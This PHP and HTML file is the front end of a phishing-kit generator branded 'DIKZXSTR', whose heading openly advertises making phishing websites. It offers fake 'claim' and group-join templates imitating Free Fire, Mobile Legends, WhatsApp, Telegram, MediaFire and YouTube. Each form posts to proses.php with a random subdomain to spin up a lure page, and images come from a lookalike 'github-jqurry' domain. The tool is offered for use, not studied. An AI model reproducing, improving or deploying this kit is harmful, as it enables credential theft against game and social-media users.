<?php
/**
 * DIKZXSTR Premium Web Creator - White Horizontal Edition
 * Lead Admin: DIKZXSTR
 */

function generateRandomSubdomain($length = 30) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789-';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

// DATABASE PRODUK
$products = [
    ['id' => '1',  'name' => 'Free Fire Claim V1', 'img' => '1.jpg', 'cat' => 'GAME'],
    ['id' => '2',  'name' => 'Free Fire Claim V2', 'img' => '2.jpg', 'cat' => 'GAME'],
    ['id' => '9',  'name' => 'Free Fire Claim V3', 'img' => '9.jpg', 'cat' => 'GAME'],
    ['id' => '10', 'name' => 'Free Fire Claim V4', 'img' => '10.jpg', 'cat' => 'GAME'],
    ['id' => '13', 'name' => 'Mobile Legends V1', 'img' => '13.jpg', 'cat' => 'GAME'],
    ['id' => '14', 'name' => 'Mobile Legends V2', 'img' => '14.jpg', 'cat' => 'GAME'],
    ['id' => '11', 'name' => 'Mobile Legends V3', 'img' => '11.jpg', 'cat' => 'GAME'],
    ['id' => '12', 'name' => 'Mobile Legends V4', 'img' => '12.jpg', 'cat' => 'GAME'],
    ['id' => '5',  'name' => 'Grup WA V1',        'img' => '5.jpg', 'cat' => 'SOCIAL'],
    ['id' => '6',  'name' => 'Grup WA V2',        'img' => '6x.jpg', 'cat' => 'SOCIAL'],
    ['id' => '7',  'name' => 'Grup Join V1',      'img' => '7.jpg', 'cat' => 'SOCIAL'],
    ['id' => '8',  'name' => 'Grup Join V2',      'img' => '8.jpg', 'cat' => 'SOCIAL'],
    ['id' => '3',  'name' => 'MediaFire MP4',     'img' => '3.jpg', 'cat' => 'SOCIAL'],
    ['id' => '4',  'name' => 'MediaFire ZIP',     'img' => '4.jpg', 'cat' => 'SOCIAL'],
    ['id' => '17', 'name' => 'Telegram 18+',      'img' => '17.jpg', 'cat' => 'SOCIAL'],
    ['id' => '18', 'name' => 'Videy Video Player', 'img' => '18.jpg', 'cat' => 'SOCIAL'],
    ['id' => '20', 'name' => 'Youtube Viral',     'img' => '20.jpg', 'cat' => 'SOCIAL'],
];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>DIKZXSTR | Premium Web Creator</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap');
        
        * {
            font-family: 'Inter', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
        }

        /* Card horizontal style seperti gambar */
        .product-card {
            background: white;
            border-radius: 1.25rem;
            transition: all 0.3s ease;
            border: 1px solid #eef2f6;
            overflow: hidden;
        }

        .product-card:hover {
            transform: translateY(-4px);
            box-shadow: 0 20px 30px -12px rgba(0, 0, 0, 0.1);
            border-color: #e2e8f0;
        }

        .btn-gradient {
            background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
            transition: all 0.3s ease;
        }

        .btn-gradient:hover {
            transform: translateY(-1px);
            box-shadow: 0 8px 20px rgba(99, 102, 241, 0.3);
        }

        .tab-active {
            background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
            color: white;
            box-shadow: 0 4px 12px rgba(99, 102, 241, 0.25);
        }

        .badge-cat {
            background: white;
            backdrop-filter: blur(4px);
            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
        }

        /* Modal */
        .modal-card {
            animation: modalSlide 0.3s ease-out;
        }

        @keyframes modalSlide {
            from {
                opacity: 0;
                transform: scale(0.95) translateY(-10px);
            }
            to {
                opacity: 1;
                transform: scale(1) translateY(0);
            }
        }
    </style>
</head>
<body class="min-h-screen pb-20">

<!-- Modal Premium -->
<div id="modal-overlay" class="fixed inset-0 z-[100] flex items-center justify-center p-6 hidden bg-black/40 backdrop-blur-sm">
    <div class="modal-card bg-white rounded-2xl max-w-sm w-full p-8 relative shadow-2xl">
        <button onclick="closeModal()" class="absolute top-4 right-5 text-gray-400 hover:text-gray-600 transition">
            <i class="fas fa-times text-xl"></i>
        </button>

        <div class="text-center">
            <div class="w-16 h-16 bg-gradient-to-br from-indigo-500 to-purple-600 rounded-xl flex items-center justify-center mx-auto mb-4 shadow-lg">
                <i class="fas fa-bolt text-2xl text-white"></i>
            </div>

            <h2 class="text-2xl font-bold text-gray-800">DIKZXSTR</h2>
            <p class="text-indigo-600 text-xs font-semibold uppercase tracking-wide mb-5">Premium Creator</p>

            <div class="space-y-3">
                <a href="https://whatsapp.com/channel/0029VbCUiI2L2ATqve3SX02b" target="_blank" class="w-full bg-gray-50 hover:bg-gray-100 text-gray-700 py-3 rounded-xl font-semibold flex items-center justify-center gap-3 transition border border-gray-200">
                    <i class="fab fa-whatsapp text-xl text-green-600"></i>
                    <span>Group WhatsApp (KLIK)</span>
                </a>

                <button onclick="scrollToWeb()" class="w-full btn-gradient text-white py-3 rounded-xl font-semibold flex items-center justify-center gap-3 shadow-md">
                    <i class="fas fa-magic"></i>
                    <span>Buat Web Sekarang</span>
                </button>
            </div>
        </div>
    </div>
</div>

<!-- Header -->
<header class="sticky top-0 z-40 bg-white/80 backdrop-blur-xl border-b border-gray-100 shadow-sm">
    <div class="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
        <div class="flex items-center gap-2">
            <div class="w-8 h-8 bg-gradient-to-br from-indigo-600 to-purple-600 rounded-lg flex items-center justify-center">
                <i class="fas fa-code text-white text-sm"></i>
            </div>
            <span class="text-xl font-bold text-gray-800">DIKZX<span class="text-indigo-600">STR</span></span>
        </div>
        <button onclick="openModal()" class="w-9 h-9 rounded-full bg-gray-100 hover:bg-gray-200 flex items-center justify-center text-gray-600 transition">
            <i class="fas fa-headset text-sm"></i>
        </button>
    </div>
</header>

<!-- Main Content -->
<main class="max-w-7xl mx-auto px-4 mt-6">
    <!-- Hero -->
    <div class="text-center mb-8">
        <div class="inline-flex items-center gap-2 bg-indigo-50 px-4 py-1.5 rounded-full mb-3">
            <i class="fas fa-shield-alt text-indigo-600 text-xs"></i>
            <span class="text-xs font-semibold text-indigo-600">Premium Quality</span>
        </div>
        <h1 class="text-3xl font-bold text-gray-800">
            Buat Website <span class="text-indigo-600">Phising</span>
        </h1>
        <p class="text-gray-500 text-sm mt-2">Pilih template & buat dalam hitungan detik</p>
    </div>

    <!-- Filter Tabs -->
    <div class="flex flex-wrap gap-2 justify-center mb-8">
        <button onclick="filterCat('ALL')" id="btn-ALL" class="tab-btn px-5 py-2 rounded-xl text-sm font-semibold transition-all tab-active shadow-sm">Semua</button>
        <button onclick="filterCat('GAME')" id="btn-GAME" class="tab-btn px-5 py-2 rounded-xl text-sm font-semibold transition-all bg-gray-100 text-gray-600 hover:bg-gray-200">Game</button>
        <button onclick="filterCat('SOCIAL')" id="btn-SOCIAL" class="tab-btn px-5 py-2 rounded-xl text-sm font-semibold transition-all bg-gray-100 text-gray-600 hover:bg-gray-200">Social Media</button>
    </div>

    <!-- Products Grid - 2 Kolom seperti gambar -->
    <div id="product-container" class="grid grid-cols-2 gap-3 md:gap-4">
        <?php foreach ($products as $p): ?>
        <div class="product-card" data-category="<?= $p['cat'] ?>">
            <form method="post" action="proses.php" class="flex flex-col h-full">
                <!-- Image dengan rasio kotak kecil -->
                <div class="relative bg-gray-50">
                    <img src="https://images.github-jqurry.my.id//home/<?= $p['img'] ?>" 
                         class="w-full aspect-square object-cover"
                         alt="<?= $p['name'] ?>"
                         onerror="this.src='https://placehold.co/400x400?text=No+Image'">
                    <!-- Badge kategori di pojok -->
                    <div class="absolute top-2 left-2">
                        <span class="badge-cat text-indigo-600 text-[9px] font-bold px-2 py-1 rounded-md shadow-sm border border-gray-100">
                            <?= $p['cat'] == 'GAME' ? '🎮' : '📱' ?> <?= $p['cat'] ?>
                        </span>
                    </div>
                </div>
                
                <!-- Info Produk -->
                <div class="p-3 flex flex-col flex-grow">
                    <h3 class="font-bold text-gray-800 text-sm mb-2 line-clamp-2 text-center min-h-[2.5rem]">
                        <?= $p['name'] ?>
                    </h3>
                    <input type="hidden" name="nomor" value="<?= $p['id'] ?>" />
                    <input type="hidden" name="subdo" value="<?= generateRandomSubdomain() ?>" />
                    <input type="hidden" name="trigger_alpha_92" value="1" />
                    <button type="submit" class="btn-gradient py-2.5 rounded-xl text-xs font-semibold text-white shadow-md w-full">
                        Buat Web
                    </button>
                </div>
            </form>
        </div>
        <?php endforeach; ?>
    </div>
</main>

<script>
    const modal = document.getElementById('modal-overlay');

    // Auto open modal
    window.addEventListener('DOMContentLoaded', () => {
        setTimeout(() => { openModal(); }, 500);
    });

    function openModal() { 
        modal.classList.remove('hidden'); 
        document.body.style.overflow = 'hidden'; 
    }
    
    function closeModal() { 
        modal.classList.add('hidden'); 
        document.body.style.overflow = 'auto'; 
    }
    
    function scrollToWeb() {
        closeModal();
        window.scrollTo({ top: 400, behavior: 'smooth' });
    }

    // Filter Function
    function filterCat(cat) {
        const items = document.querySelectorAll('.product-card');
        const btns = document.querySelectorAll('.tab-btn');

        btns.forEach(btn => {
            btn.classList.remove('tab-active');
            btn.classList.add('bg-gray-100', 'text-gray-600');
        });
        
        const activeBtn = document.getElementById('btn-' + cat);
        activeBtn.classList.add('tab-active');
        activeBtn.classList.remove('bg-gray-100', 'text-gray-600');

        items.forEach(item => {
            if (cat === 'ALL' || item.getAttribute('data-category') === cat) {
                item.style.display = '';
                setTimeout(() => {
                    item.style.opacity = '1';
                }, 10);
            } else {
                item.style.opacity = '0';
                setTimeout(() => {
                    item.style.display = 'none';
                }, 200);
            }
        });
    }

    window.onclick = (e) => { 
        if (e.target == modal) closeModal(); 
    }
</script>

</body>
</html>